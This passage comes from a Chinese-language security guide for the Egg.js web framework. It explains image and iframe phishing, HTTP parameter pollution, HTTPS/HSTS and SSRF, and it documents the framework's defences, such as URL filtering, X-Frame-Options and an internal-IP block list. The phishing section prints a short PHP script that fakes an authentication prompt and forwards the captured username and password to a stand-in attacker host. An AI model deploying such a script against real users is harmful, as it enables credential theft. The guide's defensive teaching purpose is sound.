通常这种情况会出现在<code>&lt;img src=$url /&gt;</code>中，系统不对<code>$url</code>是否在域名白名单内进行校验。</p><p>攻击者可以在自己的服务器中构造以下代码：</p><p>401.php：作用为弹出 401 窗口，并且记录用户信息。</p><pre><code class="language-php">  &lt;?php
      header(&#x27;WWW-Authenticate: Basic realm=&quot;No authorization&quot;&#x27;);
      header(&#x27;HTTP/1.1 401 Unauthorized&#x27;);
          $domain = &quot;http://hacker.com/fishing/&quot;;
          if ($_SERVER[sectech:&#x27;PHP_AUTH_USER&#x27;] !== null){
                  header(&quot;Location: &quot;.$domain.&quot;record.php?a=&quot;.$_SERVER[sectech:&#x27;PHP_AUTH_USER&#x27;].&quot;&amp;b=&quot;.$_SERVER[sectech:&#x27;PHP_AUTH_PW&#x27;]);
          }
  ?&gt;</code></pre><p>之后攻击者生成一个图片链接<code>&lt;img src=&quot;http://xxx.xxx.xxx/fishing/401.php?a.jpg//&quot; /&gt;</code>。</p><p>当用户访问时，会弹出信息让用户点击，用户输入的用户名及密码会被黑客的服务器偷偷记录。</p><h3 id="防范方式">防范方式</h3><p>框架提供了 <code>.surl()</code> 宏做 url 过滤。</p><p>用于在 html 标签中中要解析 url 的地方（比如 <code>&lt;a href=&quot;&quot;/&gt;&lt;img src=&quot;&quot;/&gt;</code>），其他地方不允许使用。</p><p>对模板中要输出的变量，加 <code>helper.surl($value)</code>。</p><p><strong>注意：在需要解析 url 的地方，surl 外面一定要加上双引号，否则就会导致XSS漏洞。</strong></p><p>不使用 surl</p><pre><code class="language-html">&lt;a href=&quot;$value&quot; /&gt;</code></pre><p>output:</p><pre><code class="language-html">&lt;a href=&quot;http://ww.safe.com&lt;script&gt;&quot; /&gt;</code></pre><p>使用 surl</p><pre><code class="language-html">&lt;a href=&quot;helper.surl($value)&quot; /&gt;</code></pre><p>output:</p><pre><code class="language-html">&lt;a href=&quot;http://ww.safe.com&amp;lt;script&amp;gt;&quot; /&gt;</code></pre><h3 id="iframe-钓鱼">iframe 钓鱼</h3><p><a href="https://www.owasp.org/index.php/Cross_Frame_Scripting">iframe 钓鱼</a>，通过内嵌 iframe 到被攻击的网页中，攻击者可以引导用户去点击 iframe 指向的危险网站，甚至遮盖，影响网站的正常功能，劫持用户的点击操作。</p><p>框架提供了 <code>X-Frame-Options</code> 这个安全头来防止 iframe 钓鱼。默认值为 SAMEORIGIN，只允许同域把本页面当作 iframe 嵌入。</p><p>当需要嵌入一些可信的第三方网页时，可以关闭这个配置。</p><h2 id="安全威胁-hpp-的防范">安全威胁 HPP 的防范</h2><p>Http Parameter Pollution（HPP)，即 HTTP 参数污染攻击。在HTTP协议中是允许同样名称的参数出现多次，而由于应用的实现不规范，攻击者通过传播参数的时候传输 key 相同而 value 不同的参数，从而达到绕过某些防护的后果。</p><p>HPP 可能导致的安全威胁有：</p><ul><li>绕过防护和参数校验。</li><li>产生逻辑漏洞和报错，影响应用代码执行。</li></ul><h3 id="拓展阅读">拓展阅读</h3><ul><li><a href="https://www.owasp.org/index.php/Testing_for_HTTP_Parameter_pollution_(OTG-INPVAL-004">https://www.owasp.org/index.php/Testing<em>for_HTTP_Parameter_pollution</em>(OTG-INPVAL-004</a>)</li><li><a href="http://blog.csdn.net/eatmilkboy/article/details/6761407">http://blog.csdn.net/eatmilkboy/article/details/6761407</a></li><li><a href="https://media.blackhat.com/bh-us-11/Balduzzi/BH_US_11_Balduzzi_HPP_WP.pdf">https://media.blackhat.com/bh-us-11/Balduzzi/BH_US_11_Balduzzi_HPP_WP.pdf</a></li><li>ebay 因参数污染存在 RCE（远程命令执行）漏洞：<a href="http://secalert.net/2013/12/13/ebay-remote-code-execution/">http://secalert.net/2013/12/13/ebay-remote-code-execution/</a></li></ul><h3 id="如何防范">如何防范</h3><p>框架本身会在客户端传输 key 相同而 value 不同的参数时，强制使用第一个参数，因此不会导致 hpp 攻击。</p><h2 id="中间人攻击与-http-https"><a href="https://www.owasp.org/index.php/Man-in-the-middle_attack">中间人攻击</a>与 HTTP / HTTPS</h2><p>HTTP 是网络应用广泛使用的协议，负责 Web 内容的请求和获取。然而，内容请求和获取时会经过许多中间人，主要是网络环节，充当内容入口的浏览器、路由器厂商、WIFI提供商、通信运营商，如果使用了代理、翻墙软件则会引入更多中间人。由于 HTTP 请求的路径、参数默认情况下均是明文的，因此这些中间人可以对 HTTP 请求进行监控、劫持、阻挡。</p><p>在没有 HTTPS 时，运营商可在用户发起请求时直接跳转到某个广告，或者直接改变搜索结果插入自家的广告。如果劫持代码出现了 BUG ，则直接让用户无法使用，出现白屏。</p><p>数据泄露、请求劫持、内容篡改等等问题，核心原因就在于 HTTP 是全裸式的明文请求，域名、路径和参数都被中间人们看得一清二楚。HTTPS 做的就是给请求加密，让其对用户更加安全。对于自身而言除了保障用户利益外，还可避免本属于自己的流量被挟持，以保护自身利益。</p><p>尽管 HTTPS 并非绝对安全，掌握根证书的机构、掌握加密算法的组织同样可以进行中间人形式的攻击。不过HTTPS是现行架构下最安全的解决方案，并且它大幅增加了中间人攻击的成本。</p><p>因此，请各位使用 Egg 框架开发网站的开发者，务必推动自己的网站升级到 HTTPS。</p><p>对于 HTTPS 来讲，还有一点要注意的是 HTTP 严格传输安全（HSTS），如果不使用 HSTS，当用户在浏览器中输入网址时没有加 HTTPS，浏览器会默认使用 HTTP 访问</p><p>框架提供了 <code>hsts Strict-Transport-Security</code> 这个头的默认开启。让 HTTPS 站点不跳转到 HTTP，如果站点支持 HTTPS，请一定要开启。</p><p>如果我们的Web 站点是 http 站点，需要关闭这个头。配置如下：</p><ul><li>maxAge 默认一年 <code>365 * 24 * 3600</code>。</li><li>includeSubdomains 默认 false, 可以添加子域名，保证所有子域名都使用 HTTPS 访问。</li></ul><h2 id="安全威胁-ssrf-的防范">安全威胁 SSRF 的防范</h2><p>通过 <a href="https://www.owasp.org/index.php/Server_Side_Request_Forgery">Server-Side Request Forgery(SSRF)</a> 攻击，攻击者可以发起网络请求访问或者操作内部网络的资源。</p><p>一般来说，SSRF 安全漏洞常见于开发者在服务端直接请求客户端传递进来的 URL 资源，一旦攻击者传入一些内部的 URL 即可发起 SSRF 攻击。</p><h3 id="如何防范">如何防范</h3><p>通常我们会基于内网 IP 黑名单的形式来防范 SSRF 攻击，通过对解析域名后得到的 IP 做过滤，禁止访问内部 IP 地址来达到防范 SSRF 攻击的目的。</p><p>框架在 <code>ctx</code>, <code>app</code> 和 <code>agent</code> 上都提供了 <code>safeCurl</code> 方法，在发起网络请求的同时会对指定的内网 IP 地址过滤，除此之外，该方法和框架提供的 <code>curl</code> 方法一致。</p><ul><li><code>ctx.safeCurl(url, options)</code></li><li><code>app.safeCurl(url, options)</code></li><li><code>agent.safeCurl(url, options)</code></li></ul><h4 id="配置">配置</h4><p>直接调用 <code>safeCurl</code> 方法其实并没有任何作用，还需要配合安全配置项。</p><ul><li><code>ipBlackList</code>(Array) - 配置内网 IP 名单，在这些网段内的 IP 地址无法被访问。</li><li><code>checkAddress</code>(Function) - 直接配置一个检查 IP 地址的函数，根据函数的返回值来判断是否允许在 <code>safeCurl</code> 中被访问，当返回非 <code>true</code> 时，该 IP 无法被访问。<code>checkAddress</code> 优先级高于 <code>ipBlackList</code>。</li></ul><pre><code class="language-js">// config/config.default.js
exports.security = {
  ssrf: {
    ipBlackList: [
      &#x27;10.0.0.0/8&#x27;, // 支持 IP 网段
      &#x27;0.0.0.0/32&#x27;,
      &#x27;127.0.0.1&#x27;,  // 支持指定 IP 地址
    ],
    // 配置了 checkAddress 时，ipBlackList 不会生效
    checkAddress(ip) {
      return ip !== &#x27;127.0.0.1&#x27;;
    },
  },
};</code></pre><h2 id="其他安全工具">其他安全工具</h2><h3 id="ctxissafedomaindomain">ctx.isSafeDomain(domain)</h3><p>是否为安全域名。安全域名在配置中配置，见 <code>ctx.redirect</code> 部分。</p><h3 id="appinjectcsrfstr">app.injectCsrf(str)</h3><p>这个函数提供了模板预处理－自动插入 CSRF key 的能力，可以自动在所有的 form 标签中插入 CSRF 隐藏域，用户就不需要手动写了。</p><h3 id="appinjectnoncestr">app.injectNonce(str)</h3><p>这个函数提供了模板预处理－自动插入 nonce 的能力，如果网站开启了 CSP 安全头，并且想使用 <code>CSP 2.0 nonce</code> 特性，可以使用这个函数。参考 <a href="https://www.zhihu.com/question/21979782">CSP 是什么</a>。</p><p>这个函数会扫描模板中的 script 标签，并自动加上 nonce 头。</p><h3 id="appinjecthijackingdefensestr">app.injectHijackingDefense(str)</h3><p>对于没有开启 HTTPS 的网站，这个函数可以有限的防止运营商劫持。</p></div></div></div><div style="padding-left:8px;padding-right:8px" class="ant-col-xs-0 ant-col-md-6"><div class="markdown-body" style="font-size:14px"><div><ul><li><a href="#web-%E5%AE%89%E5%85%A8%E6%A6%82%E5%BF%B5">Web 安全概念</a><ul><li><a href="#%E5%BC%80%E5%90%AF%E4%B8%8E%E5%85%B3%E9%97%AD%E9%85%8D%E7%BD%AE">开启与关闭配置</a></li><li><a href="#match-%E5%92%8C-ignore">match 和 ignore</a></li></ul></li><li><a href="#%E5%AE%89%E5%85%A8%E5%A8%81%E8%83%81-xss-%E7%9A%84%E9%98%B2%E8%8C%83">安全威胁<code>XSS</code>的防范</a><ul><li><a href="#reflected-xss">Reflected XSS</a><ul><li><a href="#%E9%98%B2%E8%8C%83%E6%96%B9%E5%BC%8F">防范方式</a></li></ul></li><li><a href="#stored-xss">Stored XSS</a><ul><li><a href="#%E9%98%B2%E8%8C%83%E6%96%B9%E5%BC%8F">防范方式</a></li></ul></li><li><a href="#jsonp-xss">JSONP XSS</a></li><li><a href="#%E5%85%B6%E4%BB%96-xss-%E7%9A%84%E9%98%B2%E8%8C%83%E6%96%B9%E5%BC%8F">其他 XSS 的防范方式</a><ul><li><a href="#csp">CSP</a></li><li><a href="#x-download-optionsnoopen">X-Download-Options:noopen</a></li><li><a href="#x-content-type-optionsnosniff">X-Content-Type-Options:nosniff</a></li><li><a href="#x-xss-protection">X-XSS-Protection</a></li></ul></li></ul></li><li><a href="#%E5%AE%89%E5%85%A8%E5%A8%81%E8%83%81-csrf-%E7%9A%84%E9%98%B2%E8%8C%83">安全威胁 CSRF 的防范</a><ul><li><a href="#%E9%98%B2%E8%8C%83%E6%96%B9%E5%BC%8F">防范方式</a><ul><li><a href="#%E4%BD%BF%E7%94%A8%E6%96%B9%E5%BC%8F">使用方式</a><ul><li><a href="#%E5%90%8C%E6%AD%A5%E8%A1%A8%E5%8D%95%E7%9A%84-csrf-%E6%A0%A1%E9%AA%8C">同步表单的 CSRF 校验</a></li><li><a href="#ajax-%E8%AF%B7%E6%B1%82">AJAX 请求</a></li></ul></li><li><a href="#session-vs-cookie-%E5%AD%98%E5%82%A8">Session vs Cookie 存储</a></li><li><a href="#%E5%BF%BD%E7%95%A5-json-%E8%AF%B7%E6%B1%82%E5%B7%B2%E5%BA%9F%E5%BC%83">忽略 JSON 请求(已废弃)</a></li><li><a href="#%E5%88%B7%E6%96%B0-csrf-token">刷新 CSRF token</a></li></ul></li></ul></li><li><a href="#%E5%AE%89%E5%85%A8%E5%A8%81%E8%83%81-xst-%E7%9A%84%E9%98%B2%E8%8C%83">安全威胁 XST 的防范</a><ul><li><a href="#%E6%8B%93%E5%B1%95%E9%98%85%E8%AF%BB">拓展阅读</a></li><li><a href="#%E9%98%B2%E8%8C%83%E6%96%B9%E5%BC%8F">防范方式</a></li></ul></li><li><a href="#%E5%AE%89%E5%85%A8%E5%A8%81%E8%83%81-%E9%92%93%E9%B1%BC%E6%94%BB%E5%87%BB-%E7%9A%84%E9%98%B2%E8%8C%83">安全威胁 <code>钓鱼攻击</code> 的防范</a><ul><li><a href="#url-%E9%92%93%E9%B1%BC">url 钓鱼</a></li><li><a href="#%E9%98%B2%E8%8C%83%E6%96%B9%E5%BC%8F">防范方式</a></li><li><a href="#%E5%9B%BE%E7%89%87%E9%92%93%E9%B1%BC">图片钓鱼</a></li><li><a href="#%E9%98%B2%E8%8C%83%E6%96%B9%E5%BC%8F">防范方式</a></li><li><a href="#iframe-%E9%92%93%E9%B1%BC">iframe 钓鱼</a></li></ul></li><li><a href="#%E5%AE%89%E5%85%A8%E5%A8%81%E8%83%81-hpp-%E7%9A%84%E9%98%B2%E8%8C%83">安全威胁 HPP 的防范</a><ul><li><a href="#%E6%8B%93%E5%B1%95%E9%98%85%E8%AF%BB">拓展阅读</a></li><li><a href="#%E5%A6%82%E4%BD%95%E9%98%B2%E8%8C%83">如何防范</a></li></ul></li><li><a href="#%E4%B8%AD%E9%97%B4%E4%BA%BA%E6%94%BB%E5%87%BBhttpswwwowasporgindexphpman-in-the-middle_attack%E4%B8%8E-http-https">中间人攻击</a></li><li><a href="#%E5%AE%89%E5%85%A8%E5%A8%81%E8%83%81-ssrf-%E7%9A%84%E9%98%B2%E8%8C%83">安全威胁 SSRF 的防范</a><ul><li><a href="#%E5%A6%82%E4%BD%95%E9%98%B2%E8%8C%83">如何防范</a><ul><li><a href="#%E9%85%8D%E7%BD%AE">配置</a></li></ul></li></ul></li><li><a href="#%E5%85%B6%E4%BB%96%E5%AE%89%E5%85%A8%E5%B7%A5%E5%85%B7">其他安全工具</a><ul><li><a href="#ctxissafedomaindomain">ctx.isSafeDomain(domain)</a></li><li><a href="#appinjectcsrfstr">app.injectCsrf(str)</a></li><li><a href="#appinjectnoncestr">app.injectNonce(str)</a></li><li><a href="#appinjecthijackingdefensestr">app.injectHijackingDefense(str)</a></li></ul></li></ul></div></div></div></div></div></div></div></div></div><script type="text/javascript">window.__INIT_STATE__={"lang":"zh","props":{"toc":"-%20%5BWeb%20%E5%AE%89%E5%85%A8%E6%A6%82%E5%BF%B5%5D(%23web-%25E5%25AE%2589%25E5%2585%25A8%25E6%25A6%2582%25E5%25BF%25B5)%0A%20%20*%20%5B%E5%BC%80%E5%90%AF%E4%B8%8E%E5%85%B3%E9%97%AD%E9%85%8D%E7%BD%AE%5D(%23%25E5%25BC%2580%25E5%2590%25AF%25E4%25B8%258E%25E5%2585%25B3%25E9%2597%25AD%25E9%2585%258D%25E7%25BD%25AE)%0A%20%20*%20%5Bmatch%20%E5%92%8C%20ignore%5D(%23match-%25E5%2592%258C-ignore)%0A-%20%5B%E5%AE%89%E5%85%A8%E5%A8%81%E8%83%81%60%20XSS%20%60%E7%9A%84%E9%98%B2%E8%8C%83%5D(%23%25E5%25AE%2589%25E5%2585%25A8%25E5%25A8%2581%25E8%2583%2581-xss-%25E7%259A%2584%25E9%2598%25B2%25E8%258C%2583)%0A%20%20*%20%5BReflected%20XSS%5D(%23reflected-xss)%0A%20%20%20%20%2B%20%5B%E9%98%B2%E8%8C%83%E6%96%B9%E5%BC%8F%5D(%23%25E9%2598%25B2%25E8%258C%2583%25E6%2596%25B9%25E5%25BC%258F)%0A%20%20*%20%5BStored%20XSS%5D(%23stored-xss)%0A%20%20%20%20%2B%20%5B%E9%98%B2%E8%8C%83%E6%96%B9%E5%BC%8F%5D(%23%25E9%2598%25B2%25E8%258C%2583%25E6%2596%25B9%25E5%25BC%258F)%0A%20%20*%20%5BJSONP%20XSS%5D(%23jsonp-xss)%0A%20%20*%20%5B%E5%85%B6%E4%BB%96%20XSS%20%E7%9A%84%E9%98%B2%E8%8C%83%E6%96%B9%E5%BC%8F%5D(%23%25E5%2585%25B6%25E4%25BB%2596-xss-%25E7%259A%2584%25E9%2598%25B2%25E8%258C%2583%25E6%2596%25B9%25E5%25BC%258F)%0A%20%20%20%20%2B%20%5BCSP%5D(%23csp)%0A%20%20%20%20%2B%20%5BX-Download-Options%3Anoopen%5D(%23x-download-optionsnoopen)%0A%20%20%20%20%2B%20%5BX-Content-Type-Options%3Anosniff%5D(%23x-content-type-optionsnosniff)%0A%20%20%20%20%2B%20%5BX-XSS-Protection%5D(%23x-xss-protection)%0A-%20%5B%E5%AE%89%E5%85%A8%E5%A8%81%E8%83%81%20CSRF%20%E7%9A%84%E9%98%B2%E8%8C%83%5D(%23%25E5%25AE%2589%25E5%2585%25A8%25E5%25A8%2581%25E8%2583%2581-csrf-%25E7%259A%2584%25E9%2598%25B2%25E8%258C%2583)%0A%20%20*%20%5B%E9%98%B2%E8%8C%83%E6%96%B9%E5%BC%8F%5D(%23%25E9%2598%25B2%25E8%258C%2583%25E6%2596%25B9%25E5%25BC%258F)%0A%20%20%20%20%2B%20%5B%E4%BD%BF%E7%94%A8%E6%96%B9%E5%BC%8F%5D(%23%25E4%25BD%25BF%25E7%2594%25A8%25E6%2596%25B9%25E5%25BC%258F)%0A%20%20%20%20%20%20-%20%5B%E5%90%8C%E6%AD%A5%E8%A1%A8%E5%8D%95%E7%9A%84%20CSRF%20%E6%A0%A1%E9%AA%8C%5D(%23%25E5%2590%258C%25E6%25AD%25A5%25E8%25A1%25A8%25E5%258D%2595%25E7%259A%2584-csrf-%25E6%25A0%25A1%25E9%25AA%258C)%0A%20%20%20%20%20%20-%20%5BAJAX%20%E8%AF%B7%E6%B1%82%5D(%23ajax-%25E8%25AF%25B7%25E6%25B1%2582)%0A%20%20%20%20%2B%20%5BSession%20vs%20Cookie%20%E5%AD%98%E5%82%A8%5D(%23session-vs-cookie-%25E5%25AD%2598%25E5%2582%25A8)%0A%20%20%20%20%2B%20%5B%E5%BF%BD%E7%95%A5%20JSON%20%E8%AF%B7%E6%B1%82(%E5%B7%B2%E5%BA%9F%E5%BC%83)%5D(%23%25E5%25BF%25BD%25E7%2595%25A5-json-%25E8%25AF%25B7%25E6%25B1%2582%25E5%25B7%25B2%25E5%25BA%259F%25E5%25BC%2583)%0A%20%20%20%20%2B%20%5B%E5%88%B7%E6%96%B0%20CSRF%20token%5D(%23%25E5%2588%25B7%25E6%2596%25B0-csrf-token)%0A-%20%5B%E5%AE%89%E5%85%A8%E5%A8%81%E8%83%81%20XST%20%E7%9A%84%E9%98%B2%E8%8C%83%5D(%23%25E5%25AE%2589%25E5%2585%25A8%25E5%25A8%2581%25E8%2583%2581-xst-%25E7%259A%2584%25E9%2598%25B2%25E8%258C%2583)%0A%20%20*%20%5B%E6%8B%93%E5%B1%95%E9%98%85%E8%AF%BB%5D(%23%25E6%258B%2593%25E5%25B1%2595%25E9%2598%2585%25E8%25AF%25BB)%0A%20%20*%20%5B%E9%98%B2%E8%8C%83%E6%96%B9%E5%BC%8F%5D(%23%25E9%2598%25B2%25E8%258C%2583%25E6%2596%25B9%25E5%25BC%258F)%0A-%20%5B%E5%AE%89%E5%85%A8%E5%A8%81%E8%83%81%20%60%E9%92%93%E9%B1%BC%E6%94%BB%E5%87%BB%60%20%E7%9A%84%E9%98%B2%E8%8C%83%5D(%23%25E5%25AE%2589%25E5%2585%25A8%25E5%25A8%2581%25E8%2583%2581-%25E9%2592%2593%25E9%25B1%25BC%25E6%2594%25BB%25E5%2587%25BB-%25E7%259A%2584%25E9%2598%25B2%25E8%258C%2583)%0A%20%20*%20%5Burl%20%E9%92%93%E9%B1%BC%5D(%23url-%25E9%2592%2593%25E9%25B1%25BC)%0A%20%20*%20%5B%E9%98%B2%E8%8C%83%E6%96%B9%E5%BC%8F%5D(%23%25E9%2598%25B2%25E8%258C%2583%25E6%2596%25B9%25E5%25BC%258F)%0A%20%20*%20%5B%E5%9B%BE%E7%89%87%E9%92%93%E9%B1%BC%5D(%23%25E5%259B%25BE%25E7%2589%2587%25E9%2592%2593%25E9%25B1%25BC)%0A%20%20*%20%5B%E9%98%B2%E8%8C%83%E6%96%B9%E5%BC%8F%5D(%23%25E9%2598%25B2%25E8%258C%2583%25E6%2596%25B9%25E5%25BC%258F)%0A%20%20*%20%5Biframe%20%E9%92%93%E9%B1%BC%5D(%23iframe-%25E9%2592%2593%25E9%25B1%25BC)%0A-%20%5B%E5%AE%89%E5%85%A8%E5%A8%81%E8%83%81%20HPP%20%E7%9A%84%E9%98%B2%E8%8C%83%5D(%23%25E5%25AE%2589%25E5%2585%25A8%25E5%25A8%2581%25E8%2583%2581-hpp-%25E7%259A%2584%25E9%2598%25B2%25E8%258C%2583)%0A%20%20*%20%5B%E6%8B%93%E5%B1%95%E9%98%85%E8%AF%BB%5D(%23%25E6%258B%2593%25E5%25B1%2595%25E9%2598%2585%25E8%25AF%25BB)%0A%20%20*%20%5B%E5%A6%82%E4%BD%95%E9%98%B2%E8%8C%83%5D(%23%25E5%25A6%2582%25E4%25BD%2595%25E9%2598%25B2%25E8%258C%2583)%0A-%20%5B%E4%B8%AD%E9%97%B4%E4%BA%BA%E6%94%BB%E5%87%BB%5D(%23%25E4%25B8%25AD%25E9%2597%25B4%25E4%25BA%25BA%25E6%2594%25BB%25E5%2587%25BBhttpswwwowasporgindexphpman-in-the-middle_attack%25E4%25B8%258E-http-https)%0A-%20%5B%E5%AE%89%E5%85%A8%E5%A8%81%E8%83%81%20SSRF%20%E7%9A%84%E9%98%B2%E8%8C%83%5D(%23%25E5%25AE%2589%25E5%2585%25A8%25E5%25A8%2581%25E8%2583%2581-ssrf-%25E7%259A%2584%25E9%2598%25B2%25E8%258C%2583)%0A%20%20*%20%5B%E5%A6%82%E4%BD%95%E9%98%B2%E8%8C%83%5D(%23%25E5%25A6%2582%25E4%25BD%2595%25E9%2598%25B2%25E8%258C%2583)%0A%20%20%20%20%2B%20%5B%E9%85%8D%E7%BD%AE%5D(%23%25E9%2585%258D%25E7%25BD%25AE)%0A-%20%5B%E5%85%B6%E4%BB%96%E5%AE%89%E5%85%A8%E5%B7%A5%E5%85%B7%5D(%23%25E5%2585%25B6%25E4%25BB%2596%25E5%25AE%2589%25E5%2585%25A8%25E5%25B7%25A5%25E5%2585%25B7)%0A%20%20*%20%5Bctx.isSafeDomain(domain)%5D(%23ctxissafedomaindomain)%0A%20%20*%20%5Bapp.injectCsrf(str)%5D(%23appinjectcsrfstr)%0A%20%20*%20%5Bapp.injectNonce(str)%5D(%23appinjectnoncestr)%0A%20%20*%20%5Bapp.injectHijackingDefense(str)%5D(%23appinjecthijackingdefensestr)","meta":{"info":{"title":"安全"}},"content":"%0A%0A%0A%23%23%20%20Web%20%E5%AE%89%E5%85%A8%E6%A6%82%E5%BF%B5%0A%0AWeb%20%E5%BA%94%E7%94%A8%E4%B8%AD%E5%AD%98%E5%9C%A8%E5%BE%88%E5%A4%9A%E5%AE%89%E5%85%A8%E9%A3%8E%E9%99%A9%EF%BC%8C%E8%BF%99%E4%BA%9B%E9%A3%8E%E9%99%A9%E4%BC%9A%E8%A2%AB%E9%BB%91%E5%AE%A2%E5%88%A9%E7%94%A8%EF%BC%8C%E8%BD%BB%E5%88%99%E7%AF%A1%E6%94%B9%E7%BD%91%E9%A1%B5%E5%86%85%E5%AE%B9%EF%BC%8C%E9%87%8D%E5%88%99%E7%AA%83%E5%8F%96%E7%BD%91%E7%AB%99%E5%86%85%E9%83%A8%E6%95%B0%E6%8D%AE%EF%BC%8C%E6%9B%B4%E4%B8%BA%E4%B8%A5%E9%87%8D%E7%9A%84%E5%88%99%E6%98%AF%E5%9C%A8%E7%BD%91%E9%A1%B5%E4%B8%AD%E6%A4%8D%E5%85%A5%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81%EF%BC%8C%E4%BD%BF%E5%BE%97%E7%94%A8%E6%88%B7%E5%8F%97%E5%88%B0%E4%BE%B5%E5%AE%B3%E3%80%82%E5%B8%B8%E8%A7%81%E7%9A%84%E5%AE%89%E5%85%A8%E6%BC%8F%E6%B4%9E%E5%A6%82%E4%B8%8B%EF%BC%9A%0A%0A-%20XSS%20%E6%94%BB%E5%87%BB%EF%BC%9A%E5%AF%B9%20Web%20%E9%A1%B5%E9%9D%A2%E6%B3%A8%E5%85%A5%E8%84%9A%E6%9C%AC%EF%BC%8C%E4%BD%BF%E7%94%A8%20JavaScript%20%E7%AA%83%E5%8F%96%E7%94%A8%E6%88%B7%E4%BF%A1%E6%81%AF%EF%BC%8C%E8%AF%B1%E5%AF%BC%E7%94%A8%E6%88%B7%E6%93%8D%E4%BD%9C%E3%80%82%0A-%20CSRF%20%E6%94%BB%E5%87%BB%EF%BC%9A%E4%BC%AA%E9%80%A0%E7%94%A8%E6%88%B7%E8%AF%B7%E6%B1%82%E5%90%91%E7%BD%91%E7%AB%99%E5%8F%91%E8%B5%B7%E6%81%B6%E6%84%8F%E8%AF%B7%E6%B1%82%E3%80%82%0A-%20%E9%92%93%E9%B1%BC%E6%94%BB%E5%87%BB%EF%BC%9A%E5%88%A9%E7%94%A8%E7%BD%91%E7%AB%99%E7%9A%84%E8%B7%B3%E8%BD%AC%E9%93%BE%E6%8E%A5%E6%88%96%E8%80%85%E5%9B%BE%E7%89%87%E5%88%B6%E9%80%A0%E9%92%93%E9%B1%BC%E9%99%B7%E9%98%B1%E3%80%82%0A-%20HTTP%E5%8F%82%E6%95%B0%E6%B1%A1%E6%9F%93%EF%BC%9A%E5%88%A9%E7%94%A8%E5%AF%B9%E5%8F%82%E6%95%B0%E6%A0%BC%E5%BC%8F%E9%AA%8C%E8%AF%81%E7%9A%84%E4%B8%8D%E5%AE%8C%E5%96%84%EF%BC%8C%E5%AF%B9%E6%9C%8D%E5%8A%A1%E5%99%A8%E8%BF%9B%E8%A1%8C%E5%8F%82%E6%95%B0%E6%B3%A8%E5%85%A5%E6%94%BB%E5%87%BB%E3%80%82%0A-%20%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%EF%BC%9A%E7%94%A8%E6%88%B7%E9%80%9A%E8%BF%87%E6%B5%8F%E8%A7%88%E5%99%A8%E6%8F%90%E4%BA%A4%E6%89%A7%E8%A1%8C%E5%91%BD%E4%BB%A4%EF%BC%8C%E7%94%B1%E4%BA%8E%E6%9C%8D%E5%8A%A1%E5%99%A8%E7%AB%AF%E6%B2%A1%E6%9C%89%E9%92%88%E5%AF%B9%E6%89%A7%E8%A1%8C%E5%87%BD%E6%95%B0%E5%81%9A%E8%BF%87%E6%BB%A4%EF%BC%8C%E5%AF%BC%E8%87%B4%E5%9C%A8%E6%B2%A1%E6%9C%89%E6%8C%87%E5%AE%9A%E7%BB%9D%E5%AF%B9%E8%B7%AF%E5%BE%84%E7%9A%84%E6%83%85%E5%86%B5%E4%B8%8B%E5%B0%B1%E6%89%A7%E8%A1%8C%E5%91%BD%E4%BB%A4%E3%80%82%0A%0A%0A%E8%80%8C%E6%A1%86%E6%9E%B6%E6%9C%AC%E8%BA%AB%E9%92%88%E5%AF%B9%20Web%20%E7%AB%AF%E5%B8%B8%E8%A7%81%E7%9A%84%E5%AE%89%E5%85%A8%E9%A3%8E%E9%99%A9%E5%86%85%E7%BD%AE%E4%BA%86%E4%B8%B0%E5%AF%8C%E7%9A%84%E8%A7%A3%E5%86%B3%E6%96%B9%E6%A1%88%EF%BC%9A%0A%0A-%20%E5%88%A9%E7%94%A8%20%5Bextend%5D(https%3A%2F%2Fgithub.com%2Feggjs%2Fegg%2Fblob%2Fmaster%2Fdocs%2Fsource%2Fzh-cn%2Fbasics%2Fextend.md)%20%E6%9C%BA%E5%88%B6%E6%89%A9%E5%B1%95%E4%BA%86%20Helper%20API%2C%20%E6%8F%90%E4%BE%9B%E4%BA%86%E5%90%84%E7%A7%8D%E6%A8%A1%E6%9D%BF%E8%BF%87%E6%BB%A4%E5%87%BD%E6%95%B0%EF%BC%8C%E9%98%B2%E6%AD%A2%E9%92%93%E9%B1%BC%E6%88%96%20XSS%20%E6%94%BB%E5%87%BB%E3%80%82%0A-%20%E5%B8%B8%E8%A7%81%20Web%20%E5%AE%89%E5%85%A8%E5%A4%B4%E7%9A%84%E6%94%AF%E6%8C%81%E3%80%82%0A-%20CSRF%20%E7%9A%84%E9%98%B2%E5%BE%A1%E6%96%B9%E6%A1%88%E3%80%82%0A-%20%E7%81%B5%E6%B4%BB%E7%9A%84%E5%AE%89%E5%85%A8%E9%85%8D%E7%BD%AE%EF%BC%8C%E5%8F%AF%E4%BB%A5%E5%8C%B9%E9%85%8D%E4%B8%8D%E5%90%8C%E7%9A%84%E8%AF%B7%E6%B1%82%20url%20%E3%80%82%0A-%20%E5%8F%AF%E5%AE%9A%E5%88%B6%E7%9A%84%E7%99%BD%E5%90%8D%E5%8D%95%EF%BC%8C%E7%94%A8%E4%BA%8E%E5%AE%89%E5%85%A8%E8%B7%B3%E8%BD%AC%E5%92%8C%20url%20%E8%BF%87%E6%BB%A4%E3%80%82%0A-%20%E5%90%84%E7%A7%8D%E6%A8%A1%E6%9D%BF%E7%9B%B8%E5%85%B3%E7%9A%84%E5%B7%A5%E5%85%B7%E5%87%BD%E6%95%B0%E5%81%9A%E9%A2%84%E5%A4%84%E7%90%86%E3%80%82%0A%0A%E5%9C%A8%E6%A1%86%E6%9E%B6%E4%B8%AD%E5%86%85%E7%BD%AE%E4%BA%86%E5%AE%89%E5%85%A8%E6%8F%92%E4%BB%B6%20%5Begg-security%5D(https%3A%2F%2Fgithub.com%2Feggjs%2Fegg-security)%EF%BC%8C%20%E6%8F%90%E4%BE%9B%E4%BA%86%E9%BB%98%E8%AE%A4%E7%9A%84%E5%AE%89%E5%85%A8%E5%AE%9E%E8%B7%B5%E3%80%82%0A%0A%23%23%23%20%E5%BC%80%E5%90%AF%E4%B8%8E%E5%85%B3%E9%97%AD%E9%85%8D%E7%BD%AE%0A%0A%E6%B3%A8%E6%84%8F%EF%BC%9A%E9%99%A4%E9%9D%9E%E6%B8%85%E6%A5%9A%E7%9A%84%E7%A1%AE%E8%AE%A4%E5%90%8E%E6%9E%9C%EF%BC%8C%E5%90%A6%E5%88%99%E4%B8%8D%E5%BB%BA%E8%AE%AE%E6%93%85%E8%87%AA%E5%85%B3%E9%97%AD%E5%AE%89%E5%85%A8%E6%8F%92%E4%BB%B6%E6%8F%90%E4%BE%9B%E7%9A%84%E5%8A%9F%E8%83%BD%E3%8